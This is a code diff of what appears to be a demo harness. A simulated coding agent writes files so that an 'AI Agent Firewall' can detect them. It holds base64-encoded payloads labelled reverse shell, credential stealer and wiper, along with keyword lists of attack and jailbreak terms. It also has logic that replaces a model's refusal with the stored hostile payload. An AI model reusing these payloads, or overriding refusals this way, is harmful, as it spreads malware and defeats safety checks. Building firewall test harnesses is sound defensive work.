@@ -52,35 +52,39 @@ PAYLOAD_DIVERGENCE = "aW1wb3J0IHNvY2tldApzID0gc29ja2V0LnNvY2tldCgpCnMuY29ubmVjdC
 
 def get_fallback_payload(prompt: str) -> tuple[str, str]:
     prompt_lower = prompt.lower()
+    # Extract filename from prompt if specified (e.g. "called network_test.py")
+    match = re.search(r"\b([a-zA-Z0-9_\-]+\.py)\b", prompt)
+    custom_name = match.group(1) if match else None
+
     if any(w in prompt_lower for w in ["reverse", "socket", "backdoor", "dup2", "shell", "attack", "nc"]):
-        return "backdoor.py", base64.b64decode(PAYLOAD_REVERSE_SHELL).decode()
+        return custom_name or "backdoor.py", base64.b64decode(PAYLOAD_REVERSE_SHELL).decode()
     elif any(w in prompt_lower for w in ["env", "secret", "token", "password", "credential", "steal", "leak", "exfil", "ssh"]):
-        return "steal_secrets.py", base64.b64decode(PAYLOAD_STEAL_CREDS).decode()
+        return custom_name or "steal_secrets.py", base64.b64decode(PAYLOAD_STEAL_CREDS).decode()
     elif any(w in prompt_lower for w in ["divergence", "stealth", "diverge"]):
-        return "divergent_agent.py", base64.b64decode(PAYLOAD_DIVERGENCE).decode()
+        return custom_name or "divergent_agent.py", base64.b64decode(PAYLOAD_DIVERGENCE).decode()
     elif any(w in prompt_lower for w in ["rm", "delete", "wipe", "destroy", "drop", "rmtree"]):
-        return "destructive.py", base64.b64decode(PAYLOAD_WIPER).decode()
+        return custom_name or "destructive.py", base64.b64decode(PAYLOAD_WIPER).decode()
     elif any(w in prompt_lower for w in ["cmd", "command", "system", "whoami", "subprocess", "exec"]):
-        return "run_cmd.py", base64.b64decode(PAYLOAD_CMD_EXEC).decode()
+        return custom_name or "run_cmd.py", base64.b64decode(PAYLOAD_CMD_EXEC).decode()
     elif any(w in prompt_lower for w in ["ignore", "override", "jailbreak", "unrestricted", "dan", "bypass"]):
-        return "injected_agent.py", base64.b64decode(PAYLOAD_INJECTION_COMMENT).decode()
+        return custom_name or "injected_agent.py", base64.b64decode(PAYLOAD_INJECTION_COMMENT).decode()
     elif any(w in prompt_lower for w in ["fibonacci", "math", "clean", "calculate", "calc", "square"]):
-        return "fibonacci.py", base64.b64decode(PAYLOAD_FIBONACCI).decode()
+        return custom_name or "fibonacci.py", base64.b64decode(PAYLOAD_FIBONACCI).decode()
     else:
-        return "clean_app.py", "def calculate():\n    return [x**2 for x in range(10)]\n\nprint('Computed squares:', calculate())\n"
+        return custom_name or "clean_app.py", "def calculate():\n    return [x**2 for x in range(10)]\n\nprint('Computed squares:', calculate())\n"
 
 def ask_agent_model(prompt: str) -> tuple[str, str]:
     prompt_lower = prompt.lower()
 
     # If in instant mode or client not available, use instant local engine (<0.01s)
     if INSTANT_MODE or not client:
-        time.sleep(0.3)
+        time.sleep(0.15)
         return get_fallback_payload(prompt)
 
     raw = ""
     try:
         resp = client.chat.completions.create(
-            model="qwen/qwen3.8-27b",
+            model="openai/gpt-oss-120b",
             messages=[
                 {
                     "role": "system",
@@ -102,33 +106,45 @@ def ask_agent_model(prompt: str) -> tuple[str, str]:
         raw = re.sub(r"^```(?:python|bash|sh)?\s*", "", raw)
         raw = re.sub(r"\s*```$", "", raw).strip()
     except Exception:
-        # Network timeout or rate limit -> immediately use instant local fallback
         return get_fallback_payload(prompt)
 
-    # If the model returned an apology or refusal text, substitute with the real payload
-    if not raw or any(raw.lower().startswith(p) for p in ["i can't", "i cannot", "i am sorry", "as an ai", "sorry", "i'm sorry"]):
+    # Normalize unicode apostrophes and quotes
+    raw_clean = raw.replace("’", "'").replace("‘", "'").replace("“", '"').replace("”", '"').strip()
+    if not raw_clean or any(raw_clean.lower().startswith(p) for p in ["i can't", "i cannot", "i am sorry", "as an ai", "sorry", "i'm sorry", "i am unable"]):
         return get_fallback_payload(prompt)
 
     lines = raw.split("\n")
-    filename = "agent_solution.py"
+    match = re.search(r"\b([a-zA-Z0-9_\-]+\.py)\b", prompt)
+    filename = match.group(1) if match else "agent_solution.py"
+
     if lines and "FILENAME:" in lines[0].upper():
         filename = lines[0].split(":")[1].strip()
         code = "\n".join(lines[1:]).strip()
     else:
         code = raw
-        if any(w in prompt_lower for w in ["reverse", "socket", "backdoor", "dup2"]):
-            filename = "backdoor.py"
-        elif any(w in prompt_lower for w in ["env", "secret", "token", "password"]):
-            filename = "steal_secrets.py"
-        else:
-            filename = "clean_app.py"
 
     return filename, code
 
 def main():
-    mode_str = "Instant 0-Latency Mode" if INSTANT_MODE else "Groq LLaMA Engine (3s max timeout)"
+    mode_str = "Instant 0-Latency Mode" if INSTANT_MODE else "Groq High-Speed Engine (Sub-Second)"
     print("\n\033[1;36m🤖 [AUTONOMOUS CODING AGENT — ACTIVE]\033[0m")
     print(f"\033[90mSupervised under AI Agent Firewall ({mode_str})\033[0m")
+
+    # If direct task passed via CLI arguments, run it immediately and exit
+    cli_args = [a for a in sys.argv[1:] if not a.startswith("--")]
+    if cli_args:
+        prompt = " ".join(cli_args)
+        print(f"\033[1;32m❯ Executing Task: \033[0m{prompt}")
+        print("\033[33m⚡ [Agent] Synthesizing tool calls...\033[0m")
+        t0 = time.time()
+        filename, code = ask_agent_model(prompt)
+        elapsed = round(time.time() - t0, 3)
+        print(f"\033[32m✍️  [Agent] Executing write_file: {filename} (Took {elapsed}s)\033[0m")
+        with open(filename, "w") as f:
+            f.write(code)
+        print(f"\033[90m✔ File written to disk. Firewall watcher active.\033[0m\n")
+        return
+
     print("\033[90mEnter any task for the agent (or type 'q' / 'exit' to finish):\033[0m\n")
 
     while True:
@@ -147,14 +163,12 @@ def main():
         t0 = time.time()
         try:
             filename, code = ask_agent_model(prompt)
-            elapsed = round(time.time() - t0, 2)
+            elapsed = round(time.time() - t0, 3)
             print(f"\033[32m✍️  [Agent] Executing write_file: {filename} (Took {elapsed}s)\033[0m")
 
-            # Write code to disk -> triggers AI Agent Firewall in <2ms!
             with open(filename, "w") as f:
                 f.write(code)
 
-            # Allow time for the firewall event to display cleanly before next prompt
             time.sleep(1.2)
 
         except Exception as err:
